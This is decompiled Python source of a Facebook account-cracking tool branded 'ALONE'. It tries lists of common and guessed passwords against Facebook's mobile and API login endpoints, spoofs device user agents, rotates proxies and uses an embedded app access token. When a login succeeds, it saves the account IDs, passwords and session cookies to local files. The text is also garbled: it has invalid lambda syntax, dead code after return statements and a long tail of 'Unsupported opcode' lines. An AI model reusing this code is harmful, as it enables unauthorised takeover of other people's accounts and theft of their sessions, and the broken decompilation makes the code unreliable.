                cps.append(uid)
                'button_with_disabled'
            'error_detail_type'
        loop += 1
        return None
        if Exception:
            e = 'method/auth.login'
            e = None
            del e
            return None
        e = 'method/auth.login'
        del e

uaxx = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/412.0.0.22.115;FBPN/com.facebook.katana;FBLC/pt_BR;FBBV/468774204;FBCR/CLARO BR;FBMF/Xiaomi;FBBD/Redmi;FBDV/M1908C3JGG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2216};FB_FW/1;FBRV/470765339;] FBBK/1'

def rndm3(uid, passlist):
    global loop
    bo = random.choice([
        m,
        k,
        h,
        b,
        u,
        x])
    sys.stdout.write(f'''\r\r{B}[{G}ALONE[💚]<>M3{B}]{G}<>{B}[{bo}%s{B}]{G}<>{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ''' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    for pas in passlist:
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        ua = 'Davik/2.1.0 (Linux; U; Android ' + android_version + '.0.1; ' + model + ' Build/' + build + ') [FBAN/' + fban + ';FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=2.625,width=1080,height=1920};FBLC/' + fblc + ';FBRV/' + str(random.randint(0, 999999999)) + ';FBCR/' + fbcr + ';FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBPN/' + fbpn + ';FBDV/' + fbdv + ';FBSV/' + fbsv + ';FBOP/19;FBCA/' + fbca + ';]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        headers = {
            'Authorization': f'''OAuth {accessToken}''',
            'X-FB-Connection-Type': 'mobile.CTRadioAccessTechnologyLTE',
            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Type': 'unknown',
            'User-Agent': FM2(),
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger' }
        url = 'https://b-graph.facebook.com/auth/login'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print(f'''\r\r{R}[{G}ALONE-OK{R}]{G} ''' + uid + ' | ' + pas + '\x1b[1;97m')
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            print(f'''\r\r{Y}[{G}COOKIE{Y}] {G2}●{X1} ''' + coki)
            open('/sdcard/ALONE-RANDOM-M1-OK.txt', 'a').write(uid + ' | ' + pas + ' |-> ' + coki + '\n')
            oks.append(uid)
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print(f'''\r\r{B}[{Y}ALONE-CP{B}]{Y} ''' + uid + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/ALONE-CP.txt', 'a').write(uid + '|' + pas + '\n')
                cps.append(uid)
                'button_with_disabled'
            'error_detail_type'
        loop += 1
        return None
        if Exception:
            e = 'method/auth.login'
            e = None
            del e
            return None
        e = 'method/auth.login'
        del e


def login(uid):
    global loop
    Session = requests.session()
    sys.stdout.write(f'''\r\x1b[38;5;196m[\x1b[38;5;48mALONE[💚]\x1b[38;5;196m]\x1b[1;97m<>\x1b[38;5;196m[\x1b[1;37m{loop}\x1b[38;5;196m]\x1b[1;97m<>\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]\x1b[1;97m<>\x1b[38;5;196m[\x1b[38;5;46mCP•{len(cps)}\x1b[38;5;196m]''')
    sys.stdout.flush()
    for pw in ('123456', '1234567', '12345678', '123456789', '123123', '112233', '123123', '12345678', '1234567890'):
        headers = {
            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
            'user-agent': windows(),
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger' }
        rp = Session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = headers).json()
        if 'session_key' in rp:
            print(f'''\r{R}[{R}ALONE-OK[💚]{R}]{R} {uid} | {pw}''')
            open('/sdcard/ALONE-ok.txt', 'a').write(uid + '|' + pw + '\n')
            oks.append(uid)
        if 'www.facebook.com' in rp['error_msg']:
            print(f'''\r{R}[{G1}ALONE-OK[💚]{R}]{G1} {uid} | {pw}''')
            open('/sdcard/ALONE-ok.txt', 'a').write(uid + '|' + pw + '\n')
            oks.append(uid)
        if 'Please Confirm Email' in str(rp):
            print(f'''\r{R}[{G1}ALONE-2F[🖤]{R}]{G1} {uid} | {pw}''')
            open('/sdcard/ALONE-2f.txt', 'a').write(uid + '|' + pw + '\n')
            cps.append(uid)
        loop += 1
        return None
        return None


def crack(idf, pwv):
    global cp, ok, loop
    bo = random.choice([
        m,
        k,
        h,
        b,
        u,
        x])
    (sys.stdout.write(f'''\r\x1b[1;31m[\x1b[1;95mALONE[💚]<>[M1\x1b[1;31m]{P}<>\x1b[1;31m[{bo}{loop}\x1b[1;31m]<>[{H}{len(id)}\x1b[1;31m]\x1b[1;37m<>\x1b[1;31m[{H}OK•{H}{oki}\x1b[1;31m/{H}CP•{H}{cpi}\x1b[1;31m]<>[{P}{'{:.0%}'.format(loop / float(len(id)))}\x1b[1;31m]\x1b[0;37m '''),)
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        nip = random.choice(prox)
        proxs = {
            'http': 'socks4://' + nip }
        ses.headers.update({
            'Host': 'm.facebook.com',
            'upgrade-insecure-requests': '1',
            'user-agent': ua2,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'dnt': '1',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-user': 'empty',
            'sec-fetch-dest': 'document',
            'referer': 'https://m.facebook.com/',
            'accept-encoding': 'gzip, deflate br',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
        p = ses.get('https://m.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
        dataa = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            'uid': idf,
            'next': 'https://p.facebook.com/login/save-device/',
            'flow': 'login_no_pin',
            'pass': pw }
        koki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(p.cookies.get_dict().items()())
        koki += ' m_pixel_ratio=2.625; wd=412x756'
        heade = 'en-US,en;q=0.9'
        po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data = dataa, cookies = {
            'cookie': koki }, headers = heade, allow_redirects = False)
        if 'checkpoint' in po.cookies.get_dict().keys():
            print(f'''\r\x1b[0;95m[ALONExTCM-CP[🖤] {idf} • {pw}''')
            os.system('espeak -a 300 " Cp,"')
            open('CP/' + cpc, 'a').write(idf + ' • ' + pw + '\n')
            akun.append(idf + ' • ' + pw)
            cp += 1
            'accept-language'
        if 'c_user' in ses.cookies.get_dict().keys():
            ok += 1
            coki = po.cookies.get_dict()
            kuki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
            print(f'''\r\x1b[0;92m[ALONExTCM-Ok [💚] {idf} • {pw}\n\x1b[0;93m[🌺]= COOKIES • \x1b[1;96m{kuki} ''')
            os.system('espeak -a 300 " Alone,  Ok,  id"')
            open('/sdcard/Alone-OK.txt', 'a').write(idf + ' • ' + pw + ' | ' + kuki + '\n')
            ';'.join
        if requests.exceptions.ConnectionError:
            'gzip, deflate, br'
            time.sleep(31)
        loop += 1
        return None


def crackfree(idf, pwv):
    global cp, ok, loop
    bo = random.choice([
        m,
        k,
        h,
        b,
        u,
        x])
    (sys.stdout.write(f'''\r\x1b[1;31m[\x1b[1;95mALONE[💚]<>[M2\x1b[1;31m]{P}<>\x1b[1;31m[{bo}{loop}\x1b[1;31m]<>[{H}{len(id)}\x1b[1;31m]\x1b[1;37m<>\x1b[1;31m[{H}OK•{H}{oki}\x1b[1;31m/{H}CP•{H}{cp}\x1b[1;31m]<>[{P}{'{:.0%}'.format(loop / float(len(id)))}\x1b[1;31m]\x1b[0;37m '''),)
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        nip = random.choice(prox)
        proxs = {
            'http': 'socks4://' + nip }
        ses.headers.update({
            'Host': 'm.facebook.com',
            'upgrade-insecure-requests': '1',
            'user-agent': ua2,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'dnt': '1',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-user': 'empty',
            'sec-fetch-dest': 'document',
            'referer': 'https://m.facebook.com/',
            'accept-encoding': 'gzip, deflate br',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
        p = ses.get('https://m.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
        dataa = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            'uid': idf,
            'next': 'https://p.facebook.com/login/save-device/',
            'flow': 'login_no_pin',
            'pass': pw }
        koki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(p.cookies.get_dict().items()())
        koki += ' m_pixel_ratio=2.625; wd=412x756'
        heade = 'en-US,en;q=0.9'
        po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data = dataa, cookies = {
            'cookie': koki }, headers = heade, allow_redirects = False)
        if 'checkpoint' in po.cookies.get_dict().keys():
            print(f'''\r\x1b[1;96mALONE-CP[🖤] \x1b[38;5;205m {idf} | {pw}''')
            open('CP/' + cpc, 'a').write(idf + ' • ' + pw + '\n')
            akun.append(idf + ' • ' + pw)
            cp += 1
            'accept-language'
        if 'c_user' in ses.cookies.get_dict().keys():
            ok += 1
            coki = po.cookies.get_dict()
            kuki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
            print(f'''\r\x1b[1;96mALONE-OK[💚] \x1b[38;5;205m {idf} |\x1b[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \x1b[0;93m{kuki} ''')
            open('OK/' + okc, 'a').write(idf + ' • ' + pw + '\n')
            ';'.join
        if requests.exceptions.ConnectionError:
            'gzip, deflate, br'
            time.sleep(31)
        loop += 1
        return None


def cracktouch(idf, pwv):
    global cp, ok, loop
    bo = random.choice([
        m,
        k,
        h,
        b,
        u,
        x])
    (sys.stdout.write(f'''\r\x1b[1;31m[\x1b[1;95mALONE[💚]<>[M3\x1b[1;31m]{P}<>\x1b[1;31m[{bo}{loop}\x1b[1;31m]<>[{H}{len(id)}\x1b[1;31m]\x1b[1;37m<>\x1b[1;31m[{H}OK•{H}{oki}\x1b[1;31m/{H}CP•{H}{cp}\x1b[1;31m]<>[{P}{'{:.0%}'.format(loop / float(len(id)))}\x1b[1;31m]\x1b[0;37m '''),)
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        nip = random.choice(prox)
        proxs = {
            'http': 'socks4://' + nip }
        ses.headers.update({
            'Host': 'm.facebook.com',
            'upgrade-insecure-requests': '1',
            'user-agent': ua2,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'dnt': '1',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-user': 'empty',
            'sec-fetch-dest': 'document',
            'referer': 'https://m.facebook.com/',
            'accept-encoding': 'gzip, deflate br',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
        p = ses.get('https://m.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
        dataa = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            'uid': idf,
            'next': 'https://p.facebook.com/login/save-device/',
            'flow': 'login_no_pin',
            'pass': pw }
        koki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(p.cookies.get_dict().items()())
        koki += ' m_pixel_ratio=2.625; wd=412x756'
        heade = 'en-US,en;q=0.9'
        po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data = dataa, cookies = {
            'cookie': koki }, headers = heade, allow_redirects = False)
        if 'checkpoint' in po.cookies.get_dict().keys():
            print(f'''\r\x1b[1;95mALONE-CP[🖤] \x1b[38;5;205m {idf} | {pw}''')
            open('CP/' + cpc, 'a').write(idf + ' • ' + pw + '\n')
            akun.append(idf + ' • ' + pw)
            cp += 1
            'accept-language'
        if 'c_user' in ses.cookies.get_dict().keys():
            ok += 1
            coki = po.cookies.get_dict()
            kuki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
            print(f'''\r\x1b[1;96mALONE-OK[💚] \x1b[38;5;205m {idf} |\x1b[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \x1b[0;93m{kuki} ''')
            open('OK/' + okc, 'a').write(idf + ' • ' + pw + '\n')
            ';'.join
        if requests.exceptions.ConnectionError:
            'gzip, deflate, br'
            time.sleep(31)
        loop += 1
        return None

if __name__ == '__main__':
    os.mkdir('OK')
    os.mkdir('CP')
    key == 'true'
    os.system('touch .prox.txt')
    [][{
        'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.3',
        'pct': 34.01 }][{
        'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.3',
        'pct': 16.33 }][{
        'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.',
        'pct': 6.8 }][{
        'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.',
        'pct': 5.44 }][{
        'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.3',
        'pct': 5.44 }][{
        'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
        'pct': 2.72 }][{
        'ua': 'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/119.0 Firefox/119.',
        'pct': 2.72 }][{
        'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
        'pct': 2.38 }][{
        'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.',
        'pct': 1.36 }][{
        'ua': 'Mozilla/5.0 (Linux; Android 11; moto e20 Build/RONS31.267-94-14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.3',
        'pct': 1.36 }][{
        'ua': 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.3',
        'pct': 1.36 }][{
        'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.',
        'pct': 1.36 }][{
        'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.',
        'pct': 1.36 }][{
        'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.',
        'pct': 1.36 }][{
        'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.3',
        'pct': 1.36 }][{
        'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.',
        'pct': 1.36 }][{
        'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/288.0.576558892 Mobile/15E148 Safari/604.',
        'pct': 1.36 }][{
        'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
        'pct': 1.36 }][{
        'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
        'pct': 1.36 }][{
        'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-M236B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.3',
        'pct': 1.36 }][{
        'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
        'pct': 1.36 }][{
        'ua': 'Mozilla/5.0 (Linux; Android 10; SNE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.154 Mobile Safari/537.36 OPR/78.2.4143.7548',
        'pct': 1.36 }][{
        'ua': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3',
        'pct': 1.36 }][{
        'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'pct': 0.68 }][{
        'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/288.0.576558892 Mobile/15E148 Safari/604.1',
        'pct': 0.68 }][{
        'ua': 'Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36',
        'pct': 0.34 }][{
        'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
        'pct': 0.34 }][{
        'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1',
        'pct': 0.34 }][{
        'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'pct': 0.34 }][{
        'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1',
        'pct': 0.34 }]
    main_apv()
    menu()
    return None

Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: SWAP
Unsupported opcode: POP_JUMP_BACKWARD_IF_TRUE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: COPY
Unsupported opcode: RERAISE
